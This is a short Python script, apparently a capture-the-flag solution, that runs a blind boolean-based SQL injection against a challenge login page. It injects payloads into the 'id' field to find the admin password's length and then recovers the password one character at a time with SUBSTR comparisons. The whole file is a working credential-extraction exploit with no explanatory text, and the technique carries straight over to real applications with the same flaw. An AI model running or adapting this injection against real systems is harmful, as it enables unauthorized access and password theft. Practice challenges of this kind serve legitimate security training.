from string import ascii_letters, punctuation

import requests


def get_pw_length():
    pw_length = 1

    for i in range(100):
        url = "http://ctfq.u1tramarine.blue/q6/"
        sql = f"admin' AND (SELECT LENGTH(pass) FROM user WHERE id = 'admin') = {i} --"
        login = {"id": sql, "pass": "aaa"}

        r = requests.post(url, data=login)
        if "Congratulations!" in r.text:
            print("length of admin's password is", i)
            pw_length = i

    return pw_length


def is_correct_pw(i: int, pw: str) -> bool:
    url = "http://ctfq.u1tramarine.blue/q6/"
    sql = f"admin' AND SUBSTR((SELECT pass FROM user WHERE id = 'admin'), {i}, 1) = '{pw}' --"
    login = {"id": sql, "pass": ""}
    r = requests.post(url, data=login)

    return "Congratulations!" in r.text


def main():
    pw_length = get_pw_length()

    password = ""

    for i in range(1, pw_length + 1):
        for c in ascii_letters + punctuation:
            if is_correct_pw(i, c):
                password += c
                print(password)
                break

    print("admin's password is", password)


if __name__ == "__main__":
    main()
